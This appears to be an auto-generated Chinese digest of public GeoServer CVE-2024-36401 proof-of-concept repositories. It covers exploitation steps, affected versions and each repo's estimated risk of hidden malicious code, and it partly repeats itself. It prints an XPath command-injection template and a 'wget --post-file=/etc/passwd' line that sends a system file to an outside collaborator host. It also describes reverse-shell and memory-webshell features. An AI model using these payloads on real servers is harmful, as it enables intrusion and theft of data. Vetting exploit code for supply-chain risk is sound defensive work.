2.  **wget Payload:**  PoC 使用 `wget` 作为 payload，这本身存在一定风险。虽然 `wget` 通常用于下载文件，但恶意用户可能会利用它执行其他恶意操作。例如，下载并执行一个 shell 脚本。
3. **依赖风险:** 该POC依赖requests, argparse, urllib3等第三方库，如果作者上传了包含恶意代码的软件包到Pypi，存在一定的供应链风险.

综合分析，PoC 代码本身主要用于漏洞验证和利用，但如果使用者不小心配置或被中间人攻击替换catcher URL，则可能存在一定投毒风险。假设用户会检查和修改 catcher URL，并从官方源安装依赖，因此评估投毒风险为10%。

**利用方式：**

1.  **扫描目标：** 使用 PoC 客户端扫描存在漏洞的 GeoServer 实例。
2.  **发现FeatureType：** 利用`ListStoredQueries` request on WFS 获取feature type
3.  **构造恶意请求：** PoC 通过构造包含恶意 XPath 表达式的 OGC 请求，例如 WFS GetFeature 请求，来触发漏洞。XPath 表达式注入到 property/attribute name 中。
4.  **远程代码执行：** GeoServer 解析请求时，`commons-jxpath` 库会执行恶意 XPath 表达式，从而导致远程代码执行。
5.  **回调：**  被利用的服务器通过 `wget` 向指定的 catcher URL 发送请求，表明漏洞利用成功。

**项目地址:** [justin-p/geoexplorer](https://github.com/justin-p/geoexplorer)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #17

**来源**: [CVE-2024-36401-kkhackz0013_CVE-2024-36401.md](../2024/CVE-2024-36401-kkhackz0013_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行（RCE）

**影响应用:** GeoServer

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** 2.22.x (<2.22.6), 2.23.x (>=2.23.0 <2.23.6), 2.24.x (>=2.24.0 <2.24.4), 2.25.x (>=2.25.0 <2.25.2)

**利用条件:** 默认 GeoServer 安装，可通过网络访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-36401 允许未经身份验证的用户通过构造特制的 OGC 请求来执行远程代码。漏洞原因是 GeoServer 使用的 GeoTools 库不安全地将属性名称作为 XPath 表达式进行评估。攻击者可以通过 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求来利用此漏洞。

提供的POC代码 `CVE-2024-36401.py` 通过发送特制的 WFS GetPropertyValue 请求来利用漏洞。该请求包含一个 `valueReference` 参数，其中包含一个 `exec` 函数，该函数允许执行任意命令。默认POC代码使用 `nc` 命令来反弹 shell。代码中未发现明显的投毒行为。

利用方式：

1.  攻击者向存在漏洞的 GeoServer 实例发送特制的 WFS GetPropertyValue 请求。
2.  请求中的 `valueReference` 参数包含要执行的恶意代码。
3.  GeoServer 将 `valueReference` 中的属性名称传递给 commons-jxpath 库进行评估。
4.  commons-jxpath 库执行恶意代码，导致远程代码执行。

根据搜索引擎结果，此漏洞已经被积极利用，因此POC的有效性非常高。

综上，该POC有效，且未发现明显的投毒风险。利用方式清晰，风险等级为严重。

**项目地址:** [kkhackz0013/CVE-2024-36401](https://github.com/kkhackz0013/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #18

**来源**: [CVE-2024-36401-lowsuet_CVE-2024-36401.md](../2024/CVE-2024-36401-lowsuet_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 2.22.x < 2.22.6, 2.23.x < 2.23.6, 2.24.x < 2.24.4, 2.25.x < 2.25.2

**利用条件:** 目标GeoServer实例在受影响版本范围内，且允许外部网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是一个 GeoServer 中的远程代码执行漏洞，源于 GeoTools 库在处理要素类型属性名称时，不安全地将其传递给 commons-jxpath 库，导致在评估 XPath 表达式时可以执行任意代码。该漏洞影响所有 GeoServer 实例，无需身份验证即可利用。攻击者可以通过构造恶意的 WFS GetPropertyValue 请求，在目标服务器上执行任意命令。

**漏洞利用方式：**

1.  攻击者构造包含恶意 XPath 表达式的 WFS GetPropertyValue 请求。
2.  GeoServer 将属性名称传递给 commons-jxpath 库进行评估。
3.  commons-jxpath 库执行恶意 XPath 表达式，导致远程代码执行。

根据提供的漏洞利用代码，该 POC 使用 Go 语言编写，提供了一个图形化界面，允许用户指定目标 GeoServer URL 和要执行的命令，可以通过设置代理访问目标。该POC 代码通过构造恶意的`wfs:GetPropertyValue`请求，将命令传递给目标服务器执行。代码中使用了 `java.lang.Runtime.getRuntime()` 来执行命令，confirm 该方法是漏洞利用的关键。

**投毒风险分析：**

*   代码中存在网络请求功能，允许从远程服务器获取资源，增加了潜在的投毒风险。
*   代码中存在执行系统命令的功能，如果被篡改，可能被用于执行恶意操作。
*   虽然代码主要功能是利用漏洞，但如果作者植入恶意代码（例如，反弹 Shell 或下载执行恶意程序），则可能在使用者不知情的情况下感染目标系统。

考虑到以上风险，给与10%的投毒风险，请使用者在运行前仔细检查代码逻辑。

**项目地址:** [lowsuet/CVE-2024-36401](https://github.com/lowsuet/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #19

**来源**: [CVE-2024-36401-netuseradministrator_CVE-2024-36401.md](../2024/CVE-2024-36401-netuseradministrator_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 2.22.6之前, 2.23.0 - 2.23.6, 2.24.0 - 2.24.4, 2.25.0 - 2.25.2

**利用条件:** 需要网络访问，GeoServer实例运行在受影响的版本上

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 存在于 GeoServer 中，由于不安全地将属性名称作为 XPath 表达式进行评估，导致未经身份验证的用户可以通过构造的输入执行远程代码。该漏洞利用了 GeoTools 库 API 对要素类型属性名称的处理方式，使其能够被传递到 commons-jxpath 库并执行任意代码。漏洞利用代码提供了一个图形化界面，允许用户指定目标 URL 和要执行的命令。它构造一个恶意的 WFS GetPropertyValue 请求，其中 valueReference 属性包含一个执行命令的表达式 (例如, `exec(java.lang.Runtime.getRuntime(),"command")`)。然后，通过 HTTP POST 请求将该请求发送到目标 GeoServer 实例。漏洞利用代码还包括代理设置功能，允许用户通过代理服务器发送请求。该漏洞可以通过 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求触发。

**投毒风险分析：**

代码中存在一定程度的投毒风险的可能性（约10%），主要体现在以下几个方面：

*   **依赖项：** `go.mod` 文件中存在一些第三方依赖项，例如 `fyne.io/fyne/v2` 用于图形界面。虽然这些依赖项本身是常用的，但它们可能会引入潜在的安全漏洞或后门，尤其是在构建过程中。
*   **图形界面：** 图形界面本身可能存在安全问题，例如，如果界面中的某些组件没有得到正确的安全处理，攻击者可能会利用这些组件来执行恶意代码。
*   **网络请求：** 代码中包含发起 HTTP 请求的代码。如果攻击者能够控制这些请求的内容，他们可能会利用这些请求来执行恶意操作。但是考虑到此项目是为了进行漏洞利用测试,因此远程请求是免不了的.
*   **内存马注入功能:** 代码声明包含内存马注入功能,虽然是为了漏洞利用,但也存在风险,可能被滥用。
*   **免责声明缺失:** 仓库中缺少明确的免责声明，可能导致使用者在未充分了解风险的情况下使用该工具，从而承担不必要的法律责任。

综上所述，该仓库中存在一定程度的投毒风险，但总体来说风险较低。使用者在使用该工具时应保持警惕，并仔细审查代码，以确保其安全性。

**项目地址:** [netuseradministrator/CVE-2024-36401](https://github.com/netuseradministrator/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #20

**来源**: [CVE-2024-36401-punitdarji_GeoServer-CVE-2024-36401.md](../2024/CVE-2024-36401-punitdarji_GeoServer-CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，允许未经身份验证的用户执行任意代码

**影响版本:** 受影响版本包括 2.23.0 到 2.23.5, 2.24.0 到 2.24.3, 2.25.0 到 2.25.1 以及低于 2.22.6 的版本

**利用条件:** 需要网络访问，GeoServer实例可访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行 (RCE) 漏洞，存在于处理属性名称表达式的过程中。该漏洞源于 GeoTools 库不安全地将属性/属性名称传递给 commons-jxpath 库，该库在评估 XPath 表达式时可以执行任意代码。此漏洞影响所有 GeoServer 实例，因为 XPath 评估不正确地应用于简单要素类型。

**有效性分析：**
根据漏洞描述和提供的POC代码，此漏洞很可能有效。POC 代码通过 `GetPropertyValue` 请求，利用 `valueReference` 参数执行任意代码。POC代码中使用了 `exec(java.lang.Runtime.getRuntime(),"<PAYLOAD>")`，这允许攻击者在服务器上执行命令。

**投毒风险分析：**
提供的POC代码本身旨在利用漏洞执行命令，例如`wget --post-file=/etc/passwd <BURP COLLOBRATOR>`。这表明，使用该代码的目的本身就是攻击和信息窃取。从代码本身来看，没有明显的迹象表明存在作者隐藏的“投毒”代码，例如篡改受害者系统上的其他文件或执行其他恶意操作，但不能排除。
仓库本身可能存在投毒风险，例如，如果存在其他隐藏的脚本或配置，则可能会导致更广泛的损害。因此，保守估计投毒风险为10%。

**利用方式：**
1.  攻击者构造恶意的OGC（例如WFS GetPropertyValue、WFS GetFeature、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic 和 WPS Execute）请求。
2.  在请求的参数中，例如 `valueReference`，注入包含恶意代码的 XPath 表达式。示例中使用的是`exec(java.lang.Runtime.getRuntime(),"<PAYLOAD>")`。
3.  GeoServer在处理请求时，会将该表达式传递给存在漏洞的 GeoTools 库进行处理。
4.  `commons-jxpath` 库执行该恶意代码，导致远程代码执行。
5.  攻击者可以利用此漏洞在服务器上执行任意命令，例如反弹 shell、读取敏感文件等。

**缓解措施：**
*   升级到 GeoServer 2.22.6、2.23.6、2.24.4 或 2.25.2 及以上版本。
*   作为临时解决方案，可以从 GeoServer 中删除 `gt-complex-x.y.jar` 文件，但这可能会影响某些功能。

**项目地址:** [punitdarji/GeoServer-CVE-2024-36401](https://github.com/punitdarji/GeoServer-CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #21

**来源**: [CVE-2024-36401-thestar0_CVE-2024-36401-WoodpeckerPlugin.md](../2024/CVE-2024-36401-thestar0_CVE-2024-36401-WoodpeckerPlugin.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** < 2.22.6, >= 2.23.0 < 2.23.6, >= 2.24.0 < 2.24.4, >= 2.25.0 < 2.25.2

**利用条件:** 默认GeoServer安装，可通过WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute请求进行利用

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401是GeoServer中的一个远程代码执行漏洞，由于GeoTools库不安全地将属性名称作为XPath表达式传递给commons-jxpath库导致的。未经身份验证的攻击者可以利用此漏洞通过构造恶意的OGC请求来执行任意代码。

**有效性：**

根据漏洞库信息和搜索结果，该漏洞已在野外被利用，并且存在公开的POC。提供的漏洞利用代码是一个Woodpecker插件，它支持批量探测和利用该漏洞，包括执行任意命令和注入内存马。该插件使用Java编写，并且提供了详细的使用说明，表明其有效性较高。

**投毒风险：**

该代码主要功能是漏洞利用，内存马注入，但是自定义内存马部分存在风险,如果被替换成恶意代码，可能存在投毒行为，因此风险为10%。

**利用方式：**

1.  **漏洞触发：** 攻击者通过构造恶意的OGC请求（例如WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute请求），将恶意XPath表达式传递给GeoServer。
2.  **XPath注入：** GeoServer使用GeoTools库处理OGC请求中的属性名称。GeoTools库不安全地将这些属性名称传递给commons-jxpath库进行处理。
3.  **代码执行：** commons-jxpath库将恶意XPath表达式作为代码执行，导致远程代码执行。
4.  **内存马注入（可选）：** 攻击者可以使用该漏洞注入内存马，以便在目标服务器上持久化控制。

**总结：** CVE-2024-36401是一个高危的远程代码执行漏洞，易于利用且影响广泛。建议受影响的用户尽快升级到安全版本或采取缓解措施（例如删除`gt-complex-x.y.jar`文件）。提供的POC代码可以有效利用该漏洞，但也应谨慎使用，以避免潜在的恶意代码风险。

**项目地址:** [thestar0/CVE-2024-36401-WoodpeckerPlugin](https://github.com/thestar0/CVE-2024-36401-WoodpeckerPlugin)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #22

**来源**: [CVE-2024-36401-whitebear-ch_GeoServerExploit.md](../2024/CVE-2024-36401-whitebear-ch_GeoServerExploit.md)

## CVE-2024-36401 - GeoServer RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 严重，未经身份验证的攻击者可以执行任意代码。

**影响版本:** 受影响版本包括 2.22.6 之前的所有版本，2.23.0 <= version < 2.23.6, 2.24.0 <= version < 2.24.4, 2.25.0 <= version < 2.25.2

**利用条件:** 默认 GeoServer 安装，需要网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 存在于 GeoServer 中，由于 GeoTools 库不安全地将属性名称作为 XPath 表达式传递给 commons-jxpath 库，导致未经身份验证的用户可以通过构造特定的 OGC 请求参数（如 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute）执行任意代码。

根据漏洞库信息和搜索结果，此漏洞利用已被积极利用。提供的漏洞利用代码（GeoServerExploit）表明已经存在可用的 PoC。

投毒风险分析：提供的漏洞利用代码仅包含 README.md 文件，展示了工具的使用示例和致谢信息。虽然从单个 README.md 文件无法完全判断是否存在投毒代码，但考虑到这是一个漏洞利用工具，仍有小概率（10%）存在作者隐藏的恶意代码或其他未公开的利用方式。需要检查完整的项目代码才能更准确地评估投毒风险。

利用方式总结：攻击者通过构造恶意的 OGC 请求，利用 commons-jxpath 库执行任意 XPath 表达式，从而实现远程代码执行。

**项目地址:** [whitebear-ch/GeoServerExploit](https://github.com/whitebear-ch/GeoServerExploit)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #23

**来源**: [CVE-2024-36401-yisas93_CVE-2024-36401-PoC.md](../2024/CVE-2024-36401-yisas93_CVE-2024-36401-PoC.md)

## CVE-2024-36401-GeoServer-远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，允许未授权的远程代码执行

**影响版本:** 2.23.0 < 2.23.6, 2.24.0 < 2.24.4, 2.25.0 < 2.25.2, < 2.22.6

**利用条件:** GeoServer实例需要能够处理WFS GetPropertyValue等OGC请求

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行漏洞，该漏洞源于 GeoTools 库 API 不安全地将属性名称传递给 commons-jxpath 库，从而允许执行任意代码。PoC 代码通过构造 WFS GetPropertyValue 请求，利用 XPath 表达式注入来执行恶意命令。该 PoC 包含一个 Python 脚本 (exploit.py) 和一个类型名称列表 (type_names.txt)。脚本首先在攻击者主机上启动一个反向 shell 监听器，然后将反向 shell 命令进行 Base64 编码，最后通过特制的 WFS GetPropertyValue 请求发送到目标 GeoServer 实例。如果成功，GeoServer 将执行该命令，并将反向 shell 连接回攻击者主机。

**有效性：**

根据漏洞描述和搜索结果，该漏洞在野外已被利用，PoC代码是有效的。

**投毒风险：**

分析提供的 PoC 代码，未发现明显的恶意代码或后门。代码功能清晰，主要用于利用漏洞执行远程命令。`type_names.txt` 文件包含 GeoServer 已知类型名称列表，用于构造请求，本身不构成安全风险。`exploit.py` 脚本的功能是生成反向 shell 命令，对其进行编码，并通过构造的 WFS GetPropertyValue 请求发送它。不存在隐藏的恶意功能。

**利用方式：**

1.  攻击者需要一台能够建立网络连接的主机。
2.  攻击者运行 PoC 脚本，指定目标 GeoServer URL，以及反向 shell 的 IP 地址和端口。
3.  PoC 脚本构造包含恶意 XPath 表达式的 WFS GetPropertyValue 请求，其中 XPath 表达式注入了反向 shell 命令。
4.  GeoServer 在处理请求时，由于漏洞，会执行该恶意命令。
5.  攻击者主机收到来自 GeoServer 实例的反向 shell 连接，从而获得对服务器的控制。

总的来说，提供的PoC没有发现有投毒代码，主要通过java.lang.Runtime.getRuntime()执行命令。

**项目地址:** [yisas93/CVE-2024-36401-PoC](https://github.com/yisas93/CVE-2024-36401-PoC)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---



---

## POC #16

**来源**: [CVE-2024-36401-justin-p_geoexplorer.md](../2024/CVE-2024-36401-justin-p_geoexplorer.md)

## CVE-2024-36401 - GeoServer远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 严重，未授权的远程代码执行

**影响版本:** 受影响版本包括 2.23.0 到 2.23.6，2.24.0 到 2.24.4，2.25.0 到 2.25.2，以及低于 2.22.6 的版本。

**利用条件:** 默认 GeoServer 安装，网络可访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行漏洞，由于 GeoTools 库 API 不安全地将属性名称作为 XPath 表达式传递给 commons-jxpath 库，导致攻击者可以通过构造特定的 OGC 请求（如 WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic 和 WPS Execute）来执行任意代码。漏洞利用通过修改property/attribute，使之成为恶意的xpath表达式，触发commons-jxpath执行代码。提供的 PoC 代码 `GeoExplorer` 旨在扫描 GeoServer 实例并利用此漏洞。 

**有效性：**

根据漏洞库信息、搜索结果以及提供的 PoC 代码，此漏洞是有效的并且已被积极利用。搜索结果中多个链接表明该漏洞已被公开披露，并且有威胁情报报告指出该漏洞已被恶意利用。

**投毒风险：**

分析提供的 PoC 代码，主要的投毒风险在于：

1.  **Catcher URL:** `client/main.py` 脚本中使用了 `-c` 参数指定 catcher URL，用于接收被利用的服务器的回调。攻击者可以控制这个 URL，将受害者重定向到恶意站点或者收集敏感信息。虽然默认值指向本地地址，但用户如果配置不当，则存在风险。
2.  **wget Payload:**  PoC 使用 `wget` 作为 payload，这本身存在一定风险。虽然 `wget` 通常用于下载文件，但恶意用户可能会利用它执行其他恶意操作。例如，下载并执行一个 shell 脚本。
3. **依赖风险:** 该POC依赖requests, argparse, urllib3等第三方库，如果作者上传了包含恶意代码的软件包到Pypi，存在一定的供应链风险.

综合分析，PoC 代码本身主要用于漏洞验证和利用，但如果使用者不小心配置或被中间人攻击替换catcher URL，则可能存在一定投毒风险。假设用户会检查和修改 catcher URL，并从官方源安装依赖，因此评估投毒风险为10%。

**利用方式：**

1.  **扫描目标：** 使用 PoC 客户端扫描存在漏洞的 GeoServer 实例。
2.  **发现FeatureType：** 利用`ListStoredQueries` request on WFS 获取feature type
3.  **构造恶意请求：** PoC 通过构造包含恶意 XPath 表达式的 OGC 请求，例如 WFS GetFeature 请求，来触发漏洞。XPath 表达式注入到 property/attribute name 中。
4.  **远程代码执行：** GeoServer 解析请求时，`commons-jxpath` 库会执行恶意 XPath 表达式，从而导致远程代码执行。
5.  **回调：**  被利用的服务器通过 `wget` 向指定的 catcher URL 发送请求，表明漏洞利用成功。

**项目地址:** [justin-p/geoexplorer](https://github.com/justin-p/geoexplorer)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #17

**来源**: [CVE-2024-36401-kkhackz0013_CVE-2024-36401.md](../2024/CVE-2024-36401-kkhackz0013_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行（RCE）

**影响应用:** GeoServer

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** 2.22.x (<2.22.6), 2.23.x (>=2.23.0 <2.23.6), 2.24.x (>=2.24.0 <2.24.4), 2.25.x (>=2.25.0 <2.25.2)

**利用条件:** 默认 GeoServer 安装，可通过网络访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-36401 允许未经身份验证的用户通过构造特制的 OGC 请求来执行远程代码。漏洞原因是 GeoServer 使用的 GeoTools 库不安全地将属性名称作为 XPath 表达式进行评估。攻击者可以通过 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求来利用此漏洞。

提供的POC代码 `CVE-2024-36401.py` 通过发送特制的 WFS GetPropertyValue 请求来利用漏洞。该请求包含一个 `valueReference` 参数，其中包含一个 `exec` 函数，该函数允许执行任意命令。默认POC代码使用 `nc` 命令来反弹 shell。代码中未发现明显的投毒行为。

利用方式：

1.  攻击者向存在漏洞的 GeoServer 实例发送特制的 WFS GetPropertyValue 请求。
2.  请求中的 `valueReference` 参数包含要执行的恶意代码。
3.  GeoServer 将 `valueReference` 中的属性名称传递给 commons-jxpath 库进行评估。
4.  commons-jxpath 库执行恶意代码，导致远程代码执行。

根据搜索引擎结果，此漏洞已经被积极利用，因此POC的有效性非常高。

综上，该POC有效，且未发现明显的投毒风险。利用方式清晰，风险等级为严重。

**项目地址:** [kkhackz0013/CVE-2024-36401](https://github.com/kkhackz0013/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #18

**来源**: [CVE-2024-36401-lowsuet_CVE-2024-36401.md](../2024/CVE-2024-36401-lowsuet_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 2.22.x < 2.22.6, 2.23.x < 2.23.6, 2.24.x < 2.24.4, 2.25.x < 2.25.2

**利用条件:** 目标GeoServer实例在受影响版本范围内，且允许外部网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是一个 GeoServer 中的远程代码执行漏洞，源于 GeoTools 库在处理要素类型属性名称时，不安全地将其传递给 commons-jxpath 库，导致在评估 XPath 表达式时可以执行任意代码。该漏洞影响所有 GeoServer 实例，无需身份验证即可利用。攻击者可以通过构造恶意的 WFS GetPropertyValue 请求，在目标服务器上执行任意命令。

**漏洞利用方式：**

1.  攻击者构造包含恶意 XPath 表达式的 WFS GetPropertyValue 请求。
2.  GeoServer 将属性名称传递给 commons-jxpath 库进行评估。
3.  commons-jxpath 库执行恶意 XPath 表达式，导致远程代码执行。

根据提供的漏洞利用代码，该 POC 使用 Go 语言编写，提供了一个图形化界面，允许用户指定目标 GeoServer URL 和要执行的命令，可以通过设置代理访问目标。该POC 代码通过构造恶意的`wfs:GetPropertyValue`请求，将命令传递给目标服务器执行。代码中使用了 `java.lang.Runtime.getRuntime()` 来执行命令，confirm 该方法是漏洞利用的关键。

**投毒风险分析：**

*   代码中存在网络请求功能，允许从远程服务器获取资源，增加了潜在的投毒风险。
*   代码中存在执行系统命令的功能，如果被篡改，可能被用于执行恶意操作。
*   虽然代码主要功能是利用漏洞，但如果作者植入恶意代码（例如，反弹 Shell 或下载执行恶意程序），则可能在使用者不知情的情况下感染目标系统。

考虑到以上风险，给与10%的投毒风险，请使用者在运行前仔细检查代码逻辑。

**项目地址:** [lowsuet/CVE-2024-36401](https://github.com/lowsuet/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #19

**来源**: [CVE-2024-36401-netuseradministrator_CVE-2024-36401.md](../2024/CVE-2024-36401-netuseradministrator_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 2.22.6之前, 2.23.0 - 2.23.6, 2.24.0 - 2.24.4, 2.25.0 - 2.25.2

**利用条件:** 需要网络访问，GeoServer实例运行在受影响的版本上

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 存在于 GeoServer 中，由于不安全地将属性名称作为 XPath 表达式进行评估，导致未经身份验证的用户可以通过构造的输入执行远程代码。该漏洞利用了 GeoTools 库 API 对要素类型属性名称的处理方式，使其能够被传递到 commons-jxpath 库并执行任意代码。漏洞利用代码提供了一个图形化界面，允许用户指定目标 URL 和要执行的命令。它构造一个恶意的 WFS GetPropertyValue 请求，其中 valueReference 属性包含一个执行命令的表达式 (例如, `exec(java.lang.Runtime.getRuntime(),"command")`)。然后，通过 HTTP POST 请求将该请求发送到目标 GeoServer 实例。漏洞利用代码还包括代理设置功能，允许用户通过代理服务器发送请求。该漏洞可以通过 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求触发。

**投毒风险分析：**

代码中存在一定程度的投毒风险的可能性（约10%），主要体现在以下几个方面：

*   **依赖项：** `go.mod` 文件中存在一些第三方依赖项，例如 `fyne.io/fyne/v2` 用于图形界面。虽然这些依赖项本身是常用的，但它们可能会引入潜在的安全漏洞或后门，尤其是在构建过程中。
*   **图形界面：** 图形界面本身可能存在安全问题，例如，如果界面中的某些组件没有得到正确的安全处理，攻击者可能会利用这些组件来执行恶意代码。
*   **网络请求：** 代码中包含发起 HTTP 请求的代码。如果攻击者能够控制这些请求的内容，他们可能会利用这些请求来执行恶意操作。但是考虑到此项目是为了进行漏洞利用测试,因此远程请求是免不了的.
*   **内存马注入功能:** 代码声明包含内存马注入功能,虽然是为了漏洞利用,但也存在风险,可能被滥用。
*   **免责声明缺失:** 仓库中缺少明确的免责声明，可能导致使用者在未充分了解风险的情况下使用该工具，从而承担不必要的法律责任。

综上所述，该仓库中存在一定程度的投毒风险，但总体来说风险较低。使用者在使用该工具时应保持警惕，并仔细审查代码，以确保其安全性。

**项目地址:** [netuseradministrator/CVE-2024-36401](https://github.com/netuseradministrator/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #20

**来源**: [CVE-2024-36401-punitdarji_GeoServer-CVE-2024-36401.md](../2024/CVE-2024-36401-punitdarji_GeoServer-CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，允许未经身份验证的用户执行任意代码

**影响版本:** 受影响版本包括 2.23.0 到 2.23.5, 2.24.0 到 2.24.3, 2.25.0 到 2.25.1 以及低于 2.22.6 的版本

**利用条件:** 需要网络访问，GeoServer实例可访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行 (RCE) 漏洞，存在于处理属性名称表达式的过程中。该漏洞源于 GeoTools 库不安全地将属性/属性名称传递给 commons-jxpath 库，该库在评估 XPath 表达式时可以执行任意代码。此漏洞影响所有 GeoServer 实例，因为 XPath 评估不正确地应用于简单要素类型。

**有效性分析：**
根据漏洞描述和提供的POC代码，此漏洞很可能有效。POC 代码通过 `GetPropertyValue` 请求，利用 `valueReference` 参数执行任意代码。POC代码中使用了 `exec(java.lang.Runtime.getRuntime(),"<PAYLOAD>")`，这允许攻击者在服务器上执行命令。

**投毒风险分析：**
提供的POC代码本身旨在利用漏洞执行命令，例如`wget --post-file=/etc/passwd <BURP COLLOBRATOR>`。这表明，使用该代码的目的本身就是攻击和信息窃取。从代码本身来看，没有明显的迹象表明存在作者隐藏的“投毒”代码，例如篡改受害者系统上的其他文件或执行其他恶意操作，但不能排除。
仓库本身可能存在投毒风险，例如，如果存在其他隐藏的脚本或配置，则可能会导致更广泛的损害。因此，保守估计投毒风险为10%。

**利用方式：**
1.  攻击者构造恶意的OGC（例如WFS GetPropertyValue、WFS GetFeature、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic 和 WPS Execute）请求。
2.  在请求的参数中，例如 `valueReference`，注入包含恶意代码的 XPath 表达式。示例中使用的是`exec(java.lang.Runtime.getRuntime(),"<PAYLOAD>")`。
3.  GeoServer在处理请求时，会将该表达式传递给存在漏洞的 GeoTools 库进行处理。
4.  `commons-jxpath` 库执行该恶意代码，导致远程代码执行。
5.  攻击者可以利用此漏洞在服务器上执行任意命令，例如反弹 shell、读取敏感文件等。

**缓解措施：**
*   升级到 GeoServer 2.22.6、2.23.6、2.24.4 或 2.25.2 及以上版本。
*   作为临时解决方案，可以从 GeoServer 中删除 `gt-complex-x.y.jar` 文件，但这可能会影响某些功能。

**项目地址:** [punitdarji/GeoServer-CVE-2024-36401](https://github.com/punitdarji/GeoServer-CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #21

